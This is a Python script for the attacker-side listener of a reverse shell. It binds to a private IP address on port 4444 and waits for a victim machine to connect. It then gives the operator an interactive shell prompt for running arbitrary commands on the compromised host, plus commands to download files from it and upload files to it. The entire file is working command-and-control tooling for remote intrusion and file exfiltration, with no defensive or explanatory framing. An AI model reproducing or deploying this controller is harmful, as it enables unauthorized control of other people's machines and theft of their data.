import socket 
import json
import base64

def server(ip, port):
    global target

    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listener.bind((ip, port))
    listener.listen(1)
    print('[+] Listening....')

    target, address = listener.accept()
    print(f"[+] Got connection from {address}")

def send(data):
    try:
        json_data = json.dumps(data)
        target.send(json_data.encode('utf-8'))
    except Exception as e:
        print(f"[ERROR] Failed to send data: {e}")

def receive():
    json_data = "" 
    while True:
        try:
            part = target.recv(1024).decode('utf-8')
            if not part:
                break
            json_data += part
            return json.loads(json_data)
        except ValueError:
            continue
        except Exception as e:
            print(f"[ERROR] Receiving failed: {e}")
            break

def run():
    while True:
        command = input('Shell#: ')
        send(command)
        
        if command == 'exit':
            print("[+] Closing connection...")
            target.close()
            break
        elif command.startswith('cd '):
            continue
        elif command.startswith('download '):
            filename = command[9:]
            try:
                with open(filename, 'wb') as f:
                    file_data = receive()
                    f.write(base64.b64decode(file_data))
                print(f"[+] File {filename} downloaded successfully!")
            except Exception as e:
                print(f"[ERROR] Download failed: {e}")
        elif command.startswith('upload '):
            filename = command[7:]
            try:
                with open(filename, 'rb') as f:
                    send(base64.b64encode(f.read()).decode('utf-8'))
                print(f"[+] File {filename} uploaded successfully!")
            except Exception as e:
                print(f"[ERROR] Upload failed: {e}")
        else:
            result = receive()
            if result:
                print(result)

server('192.168.135.128', 4444)
run()
